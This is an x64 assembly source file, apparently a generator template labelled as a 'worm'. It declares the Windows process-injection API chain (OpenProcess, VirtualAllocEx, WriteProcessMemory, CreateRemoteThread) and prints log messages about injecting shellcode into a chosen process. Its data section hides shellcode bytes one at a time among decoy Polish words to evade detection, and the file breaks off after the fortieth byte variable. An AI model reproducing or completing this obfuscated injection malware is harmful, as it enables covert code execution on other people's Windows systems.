#!name##tester2
#!types##worm
#!info##for test
#!globalVar##COMPILER_NAME##MC_win64##Compiler name
#!globalVar##OS_EXEC##win##Target system executable
#!processWorm##BasicAsm
#!lang##asm

bits 64
default rel



extern printf
extern GetLastError
extern OpenProcess
extern CloseHandle
extern VirtualAllocEx
extern WriteProcessMemory
extern CreateRemoteThread
extern WaitForSingleObject
extern ExitProcess
    
section .data
    text_exit: db "Exit Program", 10, 0
    text_build_end: db "Build code complete", 10, 0
    text_start: db "------------ Start Injection -------------", 10, 0
    text_temp: db "output: %d", 10, 0
    text_exe: db "Execute Shellcode. Shellcode len: %d bytes", 10, 0
    text_op: db "Open process PID: %d", 10, 0
    text_cp: db "---------- CLOSE PROCESS ------------", 10, 0
    text_error: db "ERROR: %d", 10, 0
    text_am: db "Try allocate memory in process", 10, 0
    text_am_addr: db "Allocate memory addr: 0x%p", 10, 0
    text_wm: db "Try write memory in process", 10, 0
    text_wm_ok: db "Writing: %d bytes", 10, 0
    text_th: db "Create Thread", 10, 0
    
    var0: db "Ala", 10, 0x48, 0
    var1: db "Kota", 10, 0x31, 0
    var2: db "Kotaaaaaaaaaaaaa", 10, 0xc9, 0
    var3: db "Ma", 10, 0x48, 0
    var4: db "Ola", 10, 0x81, 0
    var5: db "Psa", 10, 0xe9, 0
    var6: db "Kota", 10, 0xdd, 0
    var7: db "Ala", 10, 0xff, 0
    var8: db "Psa", 10, 0xff, 0
    var9: db "Psa", 10, 0xff, 0
    var10: db "Kota", 10, 0x48, 0
    var11: db "Kota", 10, 0x8d, 0
    var12: db "Ala", 10, 0x05, 0
    var13: db "Kota", 10, 0xef, 0
    var14: db "Psa", 10, 0xff, 0
    var15: db "Ma", 10, 0xff, 0
    var16: db "Ola", 10, 0xff, 0
    var17: db "Ma", 10, 0x48, 0
    var18: db "Psa", 10, 0xbb, 0
    var19: db "Ala", 10, 0xbf, 0
    var20: db "Ma", 10, 0xfa, 0
    var21: db "Kota", 10, 0x74, 0
    var22: db "Ola", 10, 0x77, 0
    var23: db "Kota", 10, 0xfc, 0
    var24: db "Kota", 10, 0xb3, 0
    var25: db "Kota", 10, 0x99, 0
    var26: db "Ala", 10, 0x94, 0
    var27: db "Ma", 10, 0x48, 0
    var28: db "Ala", 10, 0x31, 0
    var29: db "Psa", 10, 0x58, 0
    var30: db "Ala", 10, 0x27, 0
    var31: db "Kota", 10, 0x48, 0
    var32: db "Ala", 10, 0x2d, 0
    var33: db "Ola", 10, 0xf8, 0
    var34: db "Ala", 10, 0xff, 0
    var35: db "Ala", 10, 0xff, 0
    var36: db "Ala", 10, 0xff, 0
    var37: db "Ola", 10, 0xe2, 0
    var38: db "Ola", 10, 0xf4, 0
    var39: db "Ma", 10, 0x43, 0
    var40: db "Ma", 10, 0xb2, 0
